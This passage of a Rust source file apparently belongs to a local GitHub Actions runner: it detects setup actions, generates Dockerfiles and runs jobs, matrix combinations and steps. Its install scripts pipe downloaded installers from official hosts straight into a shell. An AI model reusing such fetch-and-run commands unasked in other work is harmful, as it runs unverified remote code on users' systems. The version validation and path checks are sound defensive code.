        repo if repo.starts_with("docker/") => "docker:latest".to_string(),

        // AWS actions (namespace prefix)
        repo if repo.starts_with("aws-actions/") => "amazon/aws-cli:latest".to_string(),

        // Core GitHub actions that need a full environment
        "actions/checkout"
        | "actions/upload-artifact"
        | "actions/download-artifact"
        | "actions/cache" => "catthehacker/ubuntu:act-latest".to_string(),

        // Default to Node.js for other actions
        _ => "node:20-slim".to_string(),
    }
}

/// A runtime detected from a setup action step (e.g., `actions/setup-node@v3`).
struct SetupRuntime {
    /// Language identifier (e.g., "node", "php", "python")
    language: String,
    /// Sanitized version string (e.g., "20", "8.2")
    version: String,
    /// Shell commands to install this runtime on an Ubuntu base image
    install_script: String,
}

/// Definition of a known setup action for runtime detection.
///
/// Used by both `detect_setup_runtimes` (to build combined images) and
/// `determine_action_image` (to select per-step images), keeping the two
/// in sync automatically.
struct SetupActionDef {
    /// Repository names that map to this runtime (exact match, no @version suffix).
    repos: &'static [&'static str],
    /// The `with:` key that specifies the version.
    with_key: &'static str,
    /// Default version when no `with:` key is provided.
    default_version: &'static str,
    /// Language identifier used in install scripts and image tags.
    language: &'static str,
    /// If true, fall back to the @ref from the `uses:` field when no `with:` key is set.
    /// Used by `dtolnay/rust-toolchain` which encodes the toolchain in the ref.
    version_from_ref: bool,
}

const SETUP_ACTIONS: &[SetupActionDef] = &[
    SetupActionDef {
        repos: &["actions/setup-node"],
        with_key: "node-version",
        default_version: "20",
        language: "node",
        version_from_ref: false,
    },
    SetupActionDef {
        repos: &["shivammathur/setup-php"],
        with_key: "php",
        default_version: "8.2",
        language: "php",
        version_from_ref: false,
    },
    SetupActionDef {
        repos: &["actions/setup-python"],
        with_key: "python-version",
        default_version: "3.11",
        language: "python",
        version_from_ref: false,
    },
    SetupActionDef {
        repos: &["actions/setup-go"],
        with_key: "go-version",
        default_version: "1.21",
        language: "go",
        version_from_ref: false,
    },
    SetupActionDef {
        repos: &["actions/setup-java"],
        with_key: "java-version",
        default_version: "17",
        language: "java",
        version_from_ref: false,
    },
    SetupActionDef {
        repos: &["actions/setup-dotnet"],
        with_key: "dotnet-version",
        default_version: "7.0",
        language: "dotnet",
        version_from_ref: false,
    },
    SetupActionDef {
        repos: &["actions-rs/toolchain", "dtolnay/rust-toolchain"],
        with_key: "toolchain",
        default_version: "stable",
        language: "rust",
        version_from_ref: true,
    },
];

/// Check that a version string contains only safe characters (alphanumeric, dots, hyphens, underscores).
fn is_safe_version(version: &str) -> bool {
    !version.is_empty()
        && version
            .chars()
            .all(|c| c.is_alphanumeric() || c == '.' || c == '-' || c == '_')
}

/// Scan job steps for known setup actions and return the runtimes they configure.
///
/// If the same language appears multiple times, only the last occurrence is kept
/// (matching GitHub Actions behavior where later setup steps override earlier ones).
fn detect_setup_runtimes(steps: &[Step]) -> Vec<SetupRuntime> {
    let mut runtimes: Vec<SetupRuntime> = Vec::new();

    for step in steps {
        let uses = match &step.uses {
            Some(u) => u,
            None => continue,
        };

        // Split "actions/setup-node@v3" into ("actions/setup-node", Some("v3"))
        let (repo, git_ref) = match uses.split_once('@') {
            Some((r, v)) => (r, Some(v)),
            None => (uses.as_str(), None),
        };

        let def = match SETUP_ACTIONS.iter().find(|d| d.repos.contains(&repo)) {
            Some(d) => d,
            None => continue,
        };

        let with = step.with.as_ref();
        let ver = with
            .and_then(|w| w.get(def.with_key))
            .cloned()
            .or_else(|| {
                // Some actions encode the version in the @ref (e.g., dtolnay/rust-toolchain@nightly).
                // Skip bare git SHAs — they pin the action version, not the toolchain.
                if def.version_from_ref {
                    git_ref.filter(|r| !is_git_sha(r)).map(|r| r.to_string())
                } else {
                    None
                }
            })
            .unwrap_or_else(|| def.default_version.to_string());

        // Normalize trailing ".x" suffix (e.g., "16.x" -> "16") so it doesn't
        // leak into install scripts for languages that don't expect it.
        let ver = if ver.ends_with(".x") {
            ver[..ver.len() - 2].to_string()
        } else {
            ver
        };

        if !is_safe_version(&ver) {
            wrkflw_logging::warning(&format!(
                "Ignoring {} with invalid version: {:?}",
                def.language, ver
            ));
            continue;
        }

        let rt = SetupRuntime {
            language: def.language.to_string(),
            version: ver.clone(),
            install_script: get_install_script(def.language, &ver),
        };

        // Deduplicate: later setup steps override earlier ones for the same language
        let existing_idx = runtimes.iter().position(|r| r.language == rt.language);
        if let Some(idx) = existing_idx {
            runtimes[idx] = rt;
        } else {
            runtimes.push(rt);
        }
    }

    runtimes
}

/// Return shell commands that install a language runtime on an Ubuntu base image.
fn get_install_script(language: &str, version: &str) -> String {
    match language {
        "node" => {
            // Strip .x suffix for nodesource URL (e.g., "16.x" -> "16")
            let major = version.split('.').next().unwrap_or(version);
            format!(
                "curl -fsSL https://deb.nodesource.com/setup_{}.x | bash - && apt-get install -y nodejs",
                major
            )
        }
        "php" => {
            format!(
                "apt-get install -y software-properties-common && \
                 add-apt-repository -y ppa:ondrej/php && apt-get update && \
                 apt-get install -y php{ver}-cli php{ver}-mbstring php{ver}-xml php{ver}-curl unzip && \
                 curl -sS https://getcomposer.org/installer | php -- --install-dir=/usr/local/bin --filename=composer",
                ver = version
            )
        }
        "python" => {
            format!(
                "apt-get install -y software-properties-common && \
                 add-apt-repository -y ppa:deadsnakes/ppa && apt-get update && \
                 apt-get install -y python{ver} python{ver}-venv && \
                 ln -sf /usr/bin/python{ver} /usr/bin/python && \
                 ln -sf /usr/bin/python{ver} /usr/bin/python3 && \
                 curl -sS https://bootstrap.pypa.io/get-pip.py | python{ver}",
                ver = version
            )
        }
        "go" => {
            format!(
                "ARCH=$(dpkg --print-architecture || echo amd64) && \
                 curl -fsSL https://go.dev/dl/go{}.linux-${{ARCH}}.tar.gz | tar -C /usr/local -xz && \
                 ln -s /usr/local/go/bin/go /usr/bin/go",
                version
            )
        }
        "java" => {
            format!(
                "apt-get install -y wget apt-transport-https gpg && \
                 wget -qO - https://packages.adoptium.net/artifactory/api/gpg/key/public | gpg --dearmor -o /usr/share/keyrings/adoptium.gpg && \
                 echo 'deb [signed-by=/usr/share/keyrings/adoptium.gpg] https://packages.adoptium.net/artifactory/deb $(cat /etc/os-release | grep UBUNTU_CODENAME | cut -d= -f2) main' > /etc/apt/sources.list.d/adoptium.list && \
                 apt-get update && apt-get install -y temurin-{}-jdk",
                version
            )
        }
        "dotnet" => {
            format!(
                "apt-get install -y wget && \
                 wget https://dot.net/v1/dotnet-install.sh -O /tmp/dotnet-install.sh && \
                 chmod +x /tmp/dotnet-install.sh && \
                 /tmp/dotnet-install.sh --channel {} --install-dir /usr/share/dotnet && \
                 ln -s /usr/share/dotnet/dotnet /usr/bin/dotnet",
                version
            )
        }
        "rust" => {
            format!(
                "curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y --default-toolchain {} && \
                 . $HOME/.cargo/env && \
                 ln -s $HOME/.cargo/bin/* /usr/local/bin/",
                version
            )
        }
        _ => String::new(),
    }
}

/// Generate a Dockerfile that installs multiple language runtimes on an Ubuntu base.
///
/// Extracted as a pure function so the output can be unit-tested without Docker.
fn generate_combined_dockerfile(runtimes: &[SetupRuntime], base_image: &str) -> String {
    let mut dockerfile = format!("FROM {}\n", base_image);

    // Combine base packages and all runtime install scripts into a single
    // RUN directive so there is only one `apt-get update` call and the Docker
    // layer cache works as a single unit.
    let scripts: Vec<&str> = runtimes
        .iter()
        .filter(|rt| !rt.install_script.is_empty())
        .map(|rt| rt.install_script.as_str())
        .collect();

    dockerfile.push_str("RUN apt-get update && \\\n");
    dockerfile.push_str(
        "    apt-get install -y --no-install-recommends curl bash git ca-certificates gnupg",
    );

    for script in &scripts {
        dockerfile.push_str(" && \\\n");
        dockerfile.push_str(&format!("    {}", script));
    }

    dockerfile.push_str(" && \\\n    rm -rf /var/lib/apt/lists/*\n");

    dockerfile
}

/// FNV-1a hash — deterministic across Rust toolchain versions, unlike `DefaultHasher`.
fn fnv1a_hash(data: &[u8]) -> u64 {
    const FNV_OFFSET_BASIS: u64 = 14695981039346656037;
    const FNV_PRIME: u64 = 1099511628211;
    let mut hash = FNV_OFFSET_BASIS;
    for &byte in data {
        hash ^= byte as u64;
        hash = hash.wrapping_mul(FNV_PRIME);
    }
    hash
}

/// Build a deterministic image tag from the Dockerfile content.
///
/// Includes a hash of the full Dockerfile so that changes to install scripts
/// (e.g., updated URLs) invalidate the cache even when language/version pairs
/// are unchanged.  Uses FNV-1a rather than `DefaultHasher` so the tag is
/// stable across Rust toolchain upgrades.
fn combined_image_tag(runtimes: &[SetupRuntime], dockerfile: &str) -> String {
    let mut tag_parts: Vec<String> = runtimes
        .iter()
        .map(|r| format!("{}{}", r.language, r.version))
        .collect();
    tag_parts.sort();

    let hash = fnv1a_hash(dockerfile.as_bytes());

    format!(
        "{}{}-{:x}",
        COMBINED_IMAGE_PREFIX,
        tag_parts.join("-"),
        hash
    )
}

/// Build a Docker image that combines multiple language runtimes on an Ubuntu base.
///
/// Skips the build when an image with the same tag already exists locally,
/// avoiding redundant work on repeated runs.
async fn build_combined_runtime_image(
    runtimes: &[SetupRuntime],
    base_image: &str,
    runtime: &dyn ContainerRuntime,
) -> Result<String, ExecutionError> {
    let dockerfile = generate_combined_dockerfile(runtimes, base_image);
    let tag = combined_image_tag(runtimes, &dockerfile);

    // Skip the build if the image already exists locally.
    let exists = runtime.image_exists(&tag).await.map_err(|e| {
        ExecutionError::Runtime(format!("Failed to check for existing image: {}", e))
    })?;
    if exists {
        wrkflw_logging::info(&format!("Reusing existing combined runtime image: {}", tag));
        return Ok(tag);
    }

    let temp_dir = tempfile::tempdir().map_err(|e| {
        ExecutionError::Execution(format!("Failed to create temp directory: {}", e))
    })?;

    let dockerfile_path = temp_dir.path().join("Dockerfile");
    std::fs::write(&dockerfile_path, &dockerfile)
        .map_err(|e| ExecutionError::Execution(format!("Failed to write Dockerfile: {}", e)))?;

    wrkflw_logging::info(&format!(
        "Building combined runtime image with: {}",
        runtimes
            .iter()
            .map(|r| r.language.as_str())
            .collect::<Vec<_>>()
            .join(", ")
    ));

    runtime
        .build_image(&dockerfile_path, &tag, temp_dir.path())
        .await
        .map_err(|e| {
            ExecutionError::Runtime(format!("Failed to build combined runtime image: {}", e))
        })?;

    Ok(tag)
}

/// Determine the effective runner image for a job, taking setup actions into account.
///
/// If the job has an explicit `container:` config, that takes precedence.
/// Otherwise, scans steps for setup actions and builds a combined image that
/// installs the detected runtimes on top of the runner base image (which
/// includes git and other tools needed by actions like `actions/checkout`).
async fn resolve_runner_image(
    job: &Job,
    runtime: &dyn ContainerRuntime,
) -> Result<String, ExecutionError> {
    let base_image = get_effective_runner_image(job);

    if job.container.is_some() {
        return Ok(base_image);
    }

    let setup_runtimes = detect_setup_runtimes(&job.steps);
    if setup_runtimes.is_empty() {
        Ok(base_image)
    } else {
        // Always build a combined image on the runner base so that essential
        // tools (git, curl, etc.) remain available for actions like checkout.
        build_combined_runtime_image(&setup_runtimes, &base_image, runtime).await
    }
}

async fn execute_job_batch(
    jobs: &[String],
    workflow: &WorkflowDefinition,
    runtime: &dyn ContainerRuntime,
    env_context: &HashMap<String, String>,
    verbose: bool,
    secret_manager: Option<&SecretManager>,
    secret_masker: Option<&SecretMasker>,
) -> Result<Vec<JobResult>, ExecutionError> {
    // Execute jobs in parallel
    let futures = jobs.iter().map(|job_name| {
        execute_job_with_matrix(
            job_name,
            workflow,
            runtime,
            env_context,
            verbose,
            secret_manager,
            secret_masker,
        )
    });

    let result_arrays = future::join_all(futures).await;

    // Flatten the results from all jobs and their matrix combinations
    let mut results = Vec::new();
    for result_array in result_arrays {
        match result_array {
            Ok(job_results) => results.extend(job_results),
            Err(e) => return Err(e),
        }
    }

    Ok(results)
}

// Before execute_job_with_matrix implementation, add this struct
struct JobExecutionContext<'a> {
    job_name: &'a str,
    workflow: &'a WorkflowDefinition,
    runtime: &'a dyn ContainerRuntime,
    env_context: &'a HashMap<String, String>,
    verbose: bool,
    secret_manager: Option<&'a SecretManager>,
    secret_masker: Option<&'a SecretMasker>,
}

/// Execute a job, expanding matrix if present
async fn execute_job_with_matrix(
    job_name: &str,
    workflow: &WorkflowDefinition,
    runtime: &dyn ContainerRuntime,
    env_context: &HashMap<String, String>,
    verbose: bool,
    secret_manager: Option<&SecretManager>,
    secret_masker: Option<&SecretMasker>,
) -> Result<Vec<JobResult>, ExecutionError> {
    // Get the job definition
    let job = workflow.jobs.get(job_name).ok_or_else(|| {
        ExecutionError::Execution(format!("Job '{}' not found in workflow", job_name))
    })?;

    // Evaluate job condition if present
    if let Some(if_condition) = &job.if_condition {
        let should_run = evaluate_job_condition(if_condition, env_context, workflow);
        if !should_run {
            wrkflw_logging::info(&format!(
                "⏭️ Skipping job '{}' due to condition: {}",
                job_name, if_condition
            ));
            // Return a skipped job result
            return Ok(vec![JobResult {
                name: job_name.to_string(),
                status: JobStatus::Skipped,
                steps: Vec::new(),
                logs: String::new(),
            }]);
        }
    }

    // Check if this is a matrix job
    if let Some(matrix_config) = job.matrix_config() {
        // Expand the matrix into combinations
        let combinations = wrkflw_matrix::expand_matrix(matrix_config)
            .map_err(|e| ExecutionError::Execution(format!("Failed to expand matrix: {}", e)))?;

        if combinations.is_empty() {
            wrkflw_logging::info(&format!(
                "Matrix job '{}' has no valid combinations",
                job_name
            ));
            // Return empty result for jobs with no valid combinations
            return Ok(Vec::new());
        }

        wrkflw_logging::info(&format!(
            "Matrix job '{}' expanded to {} combinations",
            job_name,
            combinations.len()
        ));

        // Set maximum parallel jobs
        let max_parallel = job.max_parallel().unwrap_or_else(|| {
            // If not specified, use a reasonable default based on CPU cores
            std::cmp::max(1, num_cpus::get())
        });

        // Execute matrix combinations
        execute_matrix_combinations(MatrixExecutionContext {
            job_name,
            job_template: job,
            combinations: &combinations,
            max_parallel,
            fail_fast: job.fail_fast(),
            workflow,
            runtime,
            env_context,
            verbose,
            secret_manager,
            secret_masker,
        })
        .await
    } else {
        // Regular job, no matrix
        let ctx = JobExecutionContext {
            job_name,
            workflow,
            runtime,
            env_context,
            verbose,
            secret_manager,
            secret_masker,
        };
        let result = execute_job(ctx).await?;
        Ok(vec![result])
    }
}

#[allow(unused_variables, unused_assignments)]
async fn execute_job(ctx: JobExecutionContext<'_>) -> Result<JobResult, ExecutionError> {
    // Get job definition
    let job = ctx.workflow.jobs.get(ctx.job_name).ok_or_else(|| {
        ExecutionError::Execution(format!("Job '{}' not found in workflow", ctx.job_name))
    })?;

    // Handle reusable workflow jobs (job-level 'uses')
    if let Some(uses) = &job.uses {
        return execute_reusable_workflow_job(&ctx, uses, job.with.as_ref(), job.secrets.as_ref())
            .await;
    }

    // Clone context and add job-specific variables
    let mut job_env = ctx.env_context.clone();

    // Add container-level environment variables (lowest precedence)
    if let Some(ref container) = job.container {
        warn_unsupported_container_fields(container);
        for (key, value) in &container.env {
            job_env.entry(key.clone()).or_insert_with(|| value.clone());
        }
    }

    // Add job-level environment variables (overrides container env)
    for (key, value) in &job.env {
        job_env.insert(key.clone(), value.clone());
    }

    // Add job-specific context
    environment::add_job_context(&mut job_env, ctx.job_name);

    // Execute job steps
    let mut step_results = Vec::new();
    let mut job_logs = String::new();

    // Create a temporary directory for this job execution
    let job_dir = tempfile::tempdir()
        .map_err(|e| ExecutionError::Execution(format!("Failed to create job directory: {}", e)))?;

    // Get the current project directory
    let current_dir = std::env::current_dir().map_err(|e| {
        ExecutionError::Execution(format!("Failed to get current directory: {}", e))
    })?;

    wrkflw_logging::info(&format!("Executing job: {}", ctx.job_name));

    let mut job_success = true;

    // Execute job steps
    // Determine runner image: prefer job container, then detect setup actions, fall back to runs-on
    let runner_image_value = resolve_runner_image(job, ctx.runtime).await?;

    // GHA default job timeout is 360 minutes; sanitize to avoid panic on negative/NaN
    let timeout_mins = sanitize_timeout_minutes(job.timeout_minutes, 360.0);
    let job_timeout = std::time::Duration::from_secs_f64(timeout_mins * 60.0);

    let step_loop = async {
        for (idx, step) in job.steps.iter().enumerate() {
            let outcome = run_step_with_guards(
                step,
                idx,
                &job_env,
                ctx.workflow,
                StepExecutionContext {
                    step,
                    step_idx: idx,
                    job_env: &job_env,
                    working_dir: job_dir.path(),
                    runtime: ctx.runtime,
                    workflow: ctx.workflow,
                    runner_image: &runner_image_value,
                    verbose: ctx.verbose,
                    matrix_combination: &None,
                    secret_manager: ctx.secret_manager,
                    secret_masker: ctx.secret_masker,
                    container_config: job.container.as_ref(),
                    workflow_defaults: ctx.workflow.defaults.as_ref(),
                    job_defaults: job.defaults.as_ref(),
                },
            )
            .await?;

            match outcome {
                StepOutcome::Skipped(result) => {
                    step_results.push(result);
                }
                StepOutcome::Completed { result, abort_job } => {
                    // Add step output to logs only in verbose mode or if there's an error
                    if ctx.verbose || result.status == StepStatus::Failure {
                        job_logs.push_str(&format!(
                            "\n=== Output from step '{}' ===\n{}\n=== End output ===\n\n",
                            result.name, result.output
                        ));
                    } else {
                        job_logs.push_str(&format!(
                            "Step '{}' completed with status: {:?}\n",
                            result.name, result.status
                        ));
                    }

                    step_results.push(result);

                    if abort_job {
                        job_success = false;
                        break;
                    }
                }
            }
        }

        Ok::<(), ExecutionError>(())
    };

    match tokio::time::timeout(job_timeout, step_loop).await {
        Ok(Ok(())) => {}
        Ok(Err(e)) => return Err(e),
        Err(_) => {
            wrkflw_logging::error(&format!(
                "Job '{}' exceeded timeout of {} minutes",
                ctx.job_name, timeout_mins
            ));
            return Ok(JobResult {
                name: ctx.job_name.to_string(),
                status: JobStatus::Failure,
                steps: step_results,
                logs: format!("{}\nJob timed out after {} minutes", job_logs, timeout_mins),
            });
        }
    }

    Ok(JobResult {
        name: ctx.job_name.to_string(),
        status: if job_success {
            JobStatus::Success
        } else {
            JobStatus::Failure
        },
        steps: step_results,
        logs: job_logs,
    })
}

// Before the execute_matrix_combinations function, add this struct
struct MatrixExecutionContext<'a> {
    job_name: &'a str,
    job_template: &'a Job,
    combinations: &'a [MatrixCombination],
    max_parallel: usize,
    fail_fast: bool,
    workflow: &'a WorkflowDefinition,
    runtime: &'a dyn ContainerRuntime,
    env_context: &'a HashMap<String, String>,
    verbose: bool,
    #[allow(dead_code)] // Planned for future implementation
    secret_manager: Option<&'a SecretManager>,
    #[allow(dead_code)] // Planned for future implementation
    secret_masker: Option<&'a SecretMasker>,
}

/// Execute a set of matrix combinations
async fn execute_matrix_combinations(
    ctx: MatrixExecutionContext<'_>,
) -> Result<Vec<JobResult>, ExecutionError> {
    let mut results = Vec::new();
    let mut any_failed = false;

    // Process combinations in chunks limited by max_parallel
    for chunk in ctx.combinations.chunks(ctx.max_parallel) {
        // Skip processing if fail-fast is enabled and a previous job failed
        if ctx.fail_fast && any_failed {
            // Add skipped results for remaining combinations
            for combination in chunk {
                let combination_name =
                    wrkflw_matrix::format_combination_name(ctx.job_name, combination);
                results.push(JobResult {
                    name: combination_name,
                    status: JobStatus::Skipped,
                    steps: Vec::new(),
                    logs: "Job skipped due to previous matrix job failure".to_string(),
                });
            }
            continue;
        }

        // Process this chunk of combinations in parallel
        let chunk_futures = chunk.iter().map(|combination| {
            execute_matrix_job(
                ctx.job_name,
                ctx.job_template,
                combination,
                ctx.workflow,
                ctx.runtime,
                ctx.env_context,
                ctx.verbose,
            )
        });

        let chunk_results = future::join_all(chunk_futures).await;

        // Process results from this chunk
        for result in chunk_results {
            match result {
                Ok(job_result) => {
                    if job_result.status == JobStatus::Failure {
                        any_failed = true;
                    }
                    results.push(job_result);
                }
                Err(e) => {
                    // On error, mark as failed and continue if not fail-fast
                    any_failed = true;
                    wrkflw_logging::error(&format!("Matrix job failed: {}", e));

                    if ctx.fail_fast {
                        return Err(e);
                    }
                }
            }
        }
    }

    Ok(results)
}

/// Execute a single matrix job combination
async fn execute_matrix_job(
    job_name: &str,
    job_template: &Job,
    combination: &MatrixCombination,
    workflow: &WorkflowDefinition,
    runtime: &dyn ContainerRuntime,
    base_env_context: &HashMap<String, String>,
    verbose: bool,
) -> Result<JobResult, ExecutionError> {
    // Create the matrix-specific job name
    let matrix_job_name = wrkflw_matrix::format_combination_name(job_name, combination);

    wrkflw_logging::info(&format!("Executing matrix job: {}", matrix_job_name));

    // Clone the environment and add matrix-specific values
    let mut job_env = base_env_context.clone();
    environment::add_matrix_context(&mut job_env, combination);

    // Add container-level environment variables (lowest precedence)
    if let Some(ref container) = job_template.container {
        warn_unsupported_container_fields(container);
        for (key, value) in &container.env {
            job_env.entry(key.clone()).or_insert_with(|| value.clone());
        }
    }

    // Add job-level environment variables (overrides container env)
    for (key, value) in &job_template.env {
        // TODO: Substitute matrix variable references in env values
        job_env.insert(key.clone(), value.clone());
    }

    // Execute the job steps
    let mut step_results = Vec::new();
    let mut job_logs = String::new();

    // Create a temporary directory for this job execution
    let job_dir = tempfile::tempdir()
        .map_err(|e| ExecutionError::Execution(format!("Failed to create job directory: {}", e)))?;

    // Get the current project directory
    let current_dir = std::env::current_dir().map_err(|e| {
        ExecutionError::Execution(format!("Failed to get current directory: {}", e))
    })?;

    let job_success = if job_template.steps.is_empty() {
        wrkflw_logging::warning(&format!("Job '{}' has no steps", matrix_job_name));
        true
    } else {
        // Execute each step
        // Determine runner image: prefer job container, then detect setup actions, fall back to runs-on
        let runner_image_value = resolve_runner_image(job_template, runtime).await?;

        let mut all_steps_ok = true;
        for (idx, step) in job_template.steps.iter().enumerate() {
            let outcome = run_step_with_guards(
                step,
                idx,
                &job_env,
                workflow,
                StepExecutionContext {
                    step,
                    step_idx: idx,
                    job_env: &job_env,
                    working_dir: job_dir.path(),
                    runtime,
                    workflow,
                    runner_image: &runner_image_value,
                    verbose,
                    matrix_combination: &Some(combination.values.clone()),
                    secret_manager: None,
                    secret_masker: None,
                    container_config: job_template.container.as_ref(),
                    workflow_defaults: workflow.defaults.as_ref(),
                    job_defaults: job_template.defaults.as_ref(),
                },
            )
            .await?;

            match outcome {
                StepOutcome::Skipped(result) => {
                    step_results.push(result);
                }
                StepOutcome::Completed { result, abort_job } => {
                    job_logs.push_str(&format!("Step: {}\n", result.name));
                    job_logs.push_str(&format!("Status: {:?}\n", result.status));

                    if verbose || result.status == StepStatus::Failure {
                        job_logs.push_str(&result.output);
                        job_logs.push_str("\n\n");
                    } else {
                        job_logs.push('\n');
                        job_logs.push('\n');
                    }

                    step_results.push(result);

                    if abort_job {
                        all_steps_ok = false;
                        break;
                    }
                }
            }
        }

        all_steps_ok
    };

    // Return job result
    Ok(JobResult {
        name: matrix_job_name,
        status: if job_success {
            JobStatus::Success
        } else {
            JobStatus::Failure
        },
        steps: step_results,
        logs: job_logs,
    })
}

/// Outcome of a single step after guards (if-condition, continue-on-error) are applied.
enum StepOutcome {
    /// Step ran (or was skipped). Contains the result and whether the job should abort.
    Completed { result: StepResult, abort_job: bool },
    /// Step was skipped due to an if-condition.
    Skipped(StepResult),
}

/// Run a step with if-condition and continue-on-error guards.
/// Returns the step result and whether the job should be aborted.
async fn run_step_with_guards(
    step: &Step,
    step_idx: usize,
    job_env: &HashMap<String, String>,
    workflow: &WorkflowDefinition,
    step_exec_ctx: StepExecutionContext<'_>,
) -> Result<StepOutcome, ExecutionError> {
    let step_name = step
        .name
        .clone()
        .unwrap_or_else(|| format!("Step {}", step_idx + 1));

    // Check step-level if condition
    if let Some(if_cond) = &step.if_condition {
        let should_run = evaluate_job_condition(if_cond, job_env, workflow);
        if !should_run {
            wrkflw_logging::info(&format!(
                "  ⏭️ Skipping step '{}' due to condition: {}",
                step_name, if_cond
            ));
            return Ok(StepOutcome::Skipped(StepResult {
                name: step_name,
                status: StepStatus::Skipped,
                output: format!("Skipped due to condition: {}", if_cond),
            }));
        }
    }

    // Wrap step execution with optional timeout; sanitize to avoid panic on negative/NaN
    let step_result = if let Some(minutes) = step.timeout_minutes {
        let safe_mins = sanitize_timeout_minutes(Some(minutes), 360.0);
        let dur = std::time::Duration::from_secs_f64(safe_mins * 60.0);
        match tokio::time::timeout(dur, execute_step(step_exec_ctx)).await {
            Ok(result) => result,
            Err(_) => {
                wrkflw_logging::error(&format!(
                    "  Step '{}' exceeded timeout of {} minutes",
                    step_name, minutes
                ));
                Ok(StepResult {
                    name: step_name.clone(),
                    status: StepStatus::Failure,
                    output: format!("Step timed out after {} minutes", minutes),
                })
            }
        }
    } else {
        execute_step(step_exec_ctx).await
    };

    match step_result {
        Ok(result) => {
            let abort_job = if result.status == StepStatus::Failure {
                if step.continue_on_error == Some(true) {
                    wrkflw_logging::info(&format!(
                        "  Step '{}' failed but continue-on-error is set, continuing",
                        result.name
                    ));
                    false
                } else {
                    true
                }
            } else {
                false
            };
            Ok(StepOutcome::Completed { result, abort_job })
        }
        Err(e) => {
            if step.continue_on_error == Some(true) {
                wrkflw_logging::info(&format!(
                    "  Step '{}' errored but continue-on-error is set, continuing",
                    step_name
                ));
                Ok(StepOutcome::Completed {
                    result: StepResult {
                        name: step_name,
                        status: StepStatus::Failure,
                        output: format!("Error: {}", e),
                    },
                    abort_job: false,
                })
            } else {
                Ok(StepOutcome::Completed {
                    result: StepResult {
                        name: step_name,
                        status: StepStatus::Failure,
                        output: format!("Error: {}", e),
                    },
                    abort_job: true,
                })
            }
        }
    }
}

/// Sanitize a timeout-minutes value, returning a safe positive finite number.
/// Falls back to `default` for `None`, `NaN`, `Infinity`, zero, or negative values.
/// Clamps to a maximum of 8640 minutes (6 days).
fn sanitize_timeout_minutes(raw: Option<f64>, default: f64) -> f64 {
    let mins = raw.unwrap_or(default);
    if mins.is_finite() && mins > 0.0 {
        mins.min(360.0 * 24.0)
    } else {
        default
    }
}

// Before the execute_step function, add this struct
struct StepExecutionContext<'a> {
    step: &'a workflow::Step,
    step_idx: usize,
    job_env: &'a HashMap<String, String>,
    working_dir: &'a Path,
    runtime: &'a dyn ContainerRuntime,
    workflow: &'a WorkflowDefinition,
    runner_image: &'a str,
    verbose: bool,
    #[allow(dead_code)]
    matrix_combination: &'a Option<HashMap<String, Value>>,
    secret_manager: Option<&'a SecretManager>,
    #[allow(dead_code)] // Planned for future implementation
    secret_masker: Option<&'a SecretMasker>,
    container_config: Option<&'a JobContainer>,
    workflow_defaults: Option<&'a workflow::Defaults>,
    job_defaults: Option<&'a workflow::Defaults>,
}

async fn execute_step(ctx: StepExecutionContext<'_>) -> Result<StepResult, ExecutionError> {
    let step_name = ctx
        .step
        .name
        .clone()
        .unwrap_or_else(|| format!("Step {}", ctx.step_idx + 1));

    if ctx.verbose {
        wrkflw_logging::info(&format!("  Executing step: {}", step_name));
    }

    // Prepare step environment
    let mut step_env = ctx.job_env.clone();

    // Add step-level environment variables (with secret substitution)
    for (key, value) in &ctx.step.env {
        let resolved_value = if let Some(secret_manager) = ctx.secret_manager {
            let mut substitution = SecretSubstitution::new(secret_manager);
            match substitution.substitute(value).await {
                Ok(resolved) => resolved,
                Err(e) => {
                    wrkflw_logging::error(&format!(
                        "Failed to resolve secrets in environment variable {}: {}",
                        key, e
                    ));
                    value.clone()
                }
            }
        } else {
            value.clone()
        };
        step_env.insert(key.clone(), resolved_value);
    }

    // Execute the step based on its type
    let step_result = if let Some(uses) = &ctx.step.uses {
        // Action step
        let action_info = ctx.workflow.resolve_action(uses);

        // Check if this is the checkout action
        if uses.starts_with("actions/checkout") {
            // Get the current directory (assumes this is where your project is)
            let current_dir = std::env::current_dir().map_err(|e| {
                ExecutionError::Execution(format!("Failed to get current dir: {}", e))
            })?;

            // Copy the project files to the workspace
            copy_directory_contents(&current_dir, ctx.working_dir)?;

            // Add info for logs
            let output = if ctx.verbose {
                let mut detailed_output =
                    "Emulated checkout: Copied current directory to workspace\n\n".to_string();

                // Add checkout action details
                detailed_output.push_str("Checkout Details:\n");
                detailed_output.push_str("  - Source: Local directory\n");
                detailed_output
                    .push_str(&format!("  - Destination: {}\n", ctx.working_dir.display()));

                // Add a summary count instead of listing all files
                if let Ok(entries) = std::fs::read_dir(&current_dir) {
                    let entry_count = entries.count();
                    detailed_output.push_str(&format!(
                        "\nCopied {} top-level items to workspace\n",
                        entry_count
                    ));
                }

                detailed_output
            } else {
                "Emulated checkout: Copied current directory to workspace".to_string()
            };

            if ctx.verbose {
                println!("  Emulated actions/checkout: copied project files to workspace");
            }

            StepResult {
                name: step_name,
                status: StepStatus::Success,
                output,
            }
        } else {
            // Get action info
            let prepared = prepare_action(&action_info, ctx.runtime).await?;

            match prepared {
                PreparedAction::Composite => {
                    if action_info.is_local {
                        // Handle local composite action
                        let action_path = Path::new(&action_info.repository);
                        execute_composite_action(
                            ctx.step,
                            action_path,
                            &step_env,
                            ctx.working_dir,
                            ctx.runtime,
                            ctx.runner_image,
                            ctx.verbose,
                        )
                        .await?
                    } else {
                        // Handle remote composite action: clone the repo and execute
                        let tempdir = tempfile::tempdir().map_err(|e| {
                            ExecutionError::Execution(format!("Failed to create temp dir: {}", e))
                        })?;
                        let repo_url = format!("https://github.com/{}.git", action_info.repository);
                        let repo_dir = tempdir.path().join("action");
                        shallow_clone(&repo_url, &action_info.version, &repo_dir).await?;
                        // If the action has a sub-path, the action.yml is inside that directory
                        let action_dir = match &action_info.sub_path {
                            Some(p) => {
                                sanitize_sub_path(p).map_err(|e| {
                                    ExecutionError::Execution(format!(
                                        "Invalid sub_path for action '{}': {}",
                                        action_info.repository, e
                                    ))
                                })?;
                                let candidate = repo_dir.join(p);
                                // Defense-in-depth: verify the resolved path is
                                // still inside the cloned repo after symlink resolution.
                                let canon_candidate = candidate.canonicalize().map_err(|e| {
                                    ExecutionError::Execution(format!(
                                        "Failed to canonicalize action sub_path: {}",
                                        e
                                    ))
                                })?;
                                let canon_repo = repo_dir.canonicalize().map_err(|e| {
                                    ExecutionError::Execution(format!(
                                        "Failed to canonicalize repo directory: {}",
                                        e
                                    ))
                                })?;
                                if !canon_candidate.starts_with(&canon_repo) {
                                    return Err(ExecutionError::Execution(format!(
